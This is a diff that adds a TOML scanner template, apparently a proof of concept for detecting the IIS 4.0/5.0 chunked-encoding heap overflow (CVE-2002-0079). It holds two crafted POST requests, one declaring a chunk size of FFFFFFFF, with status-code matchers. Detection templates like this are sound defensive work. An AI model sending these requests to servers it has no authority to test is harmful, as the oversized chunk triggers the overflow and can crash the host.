@@ -1,0 +1,59 @@
+[info]
+author = "ave"
+description = "向 IIS 4.0/5.0 服务器发送特制的分块编码 HTTP 请求，触发 ASP 处理分块传输时的堆缓冲区溢出。通过检测服务器返回的异常状态码或错误信息判断漏洞是否存在。"
+id = "POC-AVE-2002-0154"
+name = "Microsoft IIS 分块编码传输堆溢出漏洞 PoC"
+severity = "high"
+tags = ["ave-2002-0154"]
+vuln_id = [
+    "CVE-2002-0079",
+    "AVE-2002-0154",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/some.asp"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+0\r
+\r
+"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+Transfer-Encoding = "chunked"
+
+[[poc.requests.matchers]]
+expect = true
+status = [500]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/some.asp"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+FFFFFFFF\r
+\r
+"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+Transfer-Encoding = "chunked"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    503,
+]
+type = "status"
